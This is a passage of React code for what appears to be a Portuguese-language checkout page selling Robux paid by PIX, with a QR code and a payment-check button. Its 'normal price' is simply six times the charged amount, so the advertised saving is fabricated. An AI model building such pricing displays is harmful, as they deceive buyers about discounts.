                    {selectedUpsells.length > 0 && (
                      <div className="bg-green-500/20 border border-green-500/50 rounded-lg p-2.5 sm:p-3 md:p-4 animate-in fade-in slide-in-from-bottom-2">
                        <div className="flex items-center gap-1.5 sm:gap-2 mb-1 sm:mb-1.5">
                          <Gift className="w-4 h-4 sm:w-5 sm:h-5 text-green-400" />
                          <p className="text-green-300 font-bold text-xs sm:text-sm">Você adicionou:</p>
                        </div>
                        <p className="text-white text-sm sm:text-base md:text-lg lg:text-xl font-black">
                          +
                          {selectedUpsells
                            .reduce((total, id) => {
                              const upsell = upsells.find((u) => u.id === id)
                              return total + (upsell?.robux || 0) + (upsell?.bonus || 0)
                            }, 0)
                            .toLocaleString("pt-BR")}{" "}
                          Robux extras!
                        </p>
                      </div>
                    )}
                  </div>
                </div>

                <div className="bg-gradient-to-br from-primary/30 via-primary/20 to-primary/10 border-2 border-primary/50 rounded-xl p-3 sm:p-4 md:p-5 lg:p-6 text-center relative overflow-hidden">
                  <div className="absolute top-0 right-0 bg-green-500 text-white text-[9px] sm:text-[10px] font-bold px-2 sm:px-3 py-0.5 sm:py-1 rounded-bl-lg">
                    OFERTA ESPECIAL
                  </div>
                  <p className="text-white/80 text-xs sm:text-sm mb-2 sm:mb-3 font-medium px-2">
                    🎯 Total de Robux que você vai receber:
                  </p>
                  <div className="flex items-center justify-center gap-2 sm:gap-3 mb-2 sm:mb-3">
                    <img
                      src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                      alt="Robux"
                      className="w-10 h-10 sm:w-12 sm:h-12 md:w-16 md:h-16"
                    />
                    <div className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-black text-primary drop-shadow-lg">
                      {calculateTotalRobux().toLocaleString("pt-BR")}
                    </div>
                  </div>
                  <p className="text-white/70 text-sm sm:text-base md:text-lg lg:text-xl font-semibold mb-1 sm:mb-2">
                    ROBUX
                  </p>
                  <p className="text-white/60 text-xs sm:text-sm px-2 break-all">
                    Direto na sua conta @{data.username}
                  </p>
                </div>

                <div className="bg-[#2a2a2a] border border-white/20 rounded-lg p-3 sm:p-4 md:p-5 text-center space-y-2.5 sm:space-y-3">
                  <div className="space-y-1 sm:space-y-1.5">
                    <p className="text-white/60 text-[10px] sm:text-xs uppercase tracking-wide font-semibold">
                      Valor Normal
                    </p>
                    <p className="text-white/40 text-xl sm:text-2xl md:text-3xl font-bold line-through decoration-red-500 decoration-2">
                      R$ {(calculateTotal() * 6).toFixed(2).replace(".", ",")}
                    </p>
                  </div>

                  <div className="flex items-center justify-center gap-2">
                    <div className="h-px bg-gradient-to-r from-transparent via-white/20 to-transparent flex-1" />
                    <span className="text-green-400 text-[10px] sm:text-xs font-bold px-2 sm:px-3 py-0.5 sm:py-1 bg-green-500/10 rounded-full border border-green-500/30">
                      PROMOÇÃO ATIVA
                    </span>
                    <div className="h-px bg-gradient-to-r from-transparent via-white/20 to-transparent flex-1" />
                  </div>

                  <div className="space-y-2 sm:space-y-2.5">
                    <p className="text-white/80 text-xs sm:text-sm font-medium">💰 Valor Total a Pagar:</p>
                    <div className="text-center">
                      <p className="text-primary text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-black">
                        R$ {calculateTotal().toFixed(2).replace(".", ",")}
                      </p>
                      <p className="text-white/50 text-xs sm:text-sm mt-1 sm:mt-2">Pagamento único via PIX</p>
                    </div>
                    <div className="bg-primary/10 border border-primary/30 rounded-lg py-1.5 sm:py-2 px-3 sm:px-4 inline-block">
                      <p className="text-primary font-bold text-xs sm:text-sm">
                        ⚡ Você economiza R$ {(calculateTotal() * 6 - calculateTotal()).toFixed(2).replace(".", ",")}!
                      </p>
                    </div>
                  </div>
                </div>

                <div className="bg-white rounded-lg p-3 sm:p-4 md:p-5 shadow-lg relative">
                  {isRegeneratingPix && (
                    <div className="absolute inset-0 bg-white/90 backdrop-blur-sm rounded-lg flex items-center justify-center z-10">
                      <div className="text-center">
                        <img
                          src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                          alt="Loading"
                          className="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 animate-spin mx-auto mb-2"
                        />
                        <p className="text-gray-800 font-semibold text-xs sm:text-sm">Atualizando PIX...</p>
                      </div>
                    </div>
                  )}

                  <p className="text-gray-800 text-xs sm:text-sm font-semibold mb-3 sm:mb-4 text-center">
                    Escaneie o QR Code
                  </p>
                  <div className={`flex justify-center ${isRegeneratingPix ? "blur-sm" : ""}`}>
                    <img
                      src={pixData.qrCode || "/placeholder.svg"}
                      alt="QR Code PIX"
                      className="w-40 h-40 sm:w-48 sm:h-48 md:w-56 md:h-56"
                    />
                  </div>

                  <div
                    className={`mt-3 sm:mt-4 md:mt-5 space-y-2.5 sm:space-y-3 ${isRegeneratingPix ? "blur-sm" : ""}`}
                  >
                    <p className="text-gray-800 text-xs sm:text-sm font-semibold text-center">Ou copie o código PIX:</p>
                    <div className="bg-gray-100 rounded-lg p-3 sm:p-4 border-2 border-gray-300">
                      <p className="text-gray-900 text-[10px] sm:text-xs break-all leading-relaxed font-sans">
                        {pixData.pixCopyPaste}
                      </p>
                    </div>
                    <Button
                      onClick={handleCopyPix}
                      className="w-full bg-teal-500 hover:bg-teal-600 text-white font-semibold px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base transition-all"
                    >
                      {isCopied ? "✓ Código Copiado!" : "💠 Copiar Código PIX"}
                    </Button>
                  </div>
                </div>

                <div className="space-y-2.5 sm:space-y-3">
                  <Button
                    onClick={handleVerifyPayment}
                    disabled={isVerifyingPayment}
                    className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 sm:py-4 md:py-5 text-sm sm:text-base flex items-center justify-center gap-2"
                  >
                    {isVerifyingPayment ? (
                      <>
                        <img
                          src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                          alt="Loading"
                          className="w-4 h-4 sm:w-5 sm:h-5 animate-spin"
                        />
                        Verificando pagamento...
                      </>
                    ) : (
                      <>
                        <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5" />
                        Verificar Pagamento
                      </>
                    )}
                  </Button>

                  
                </div>
              </div>
            </Card>
          )}
        </div>
      </main>
    </div>
  )
}
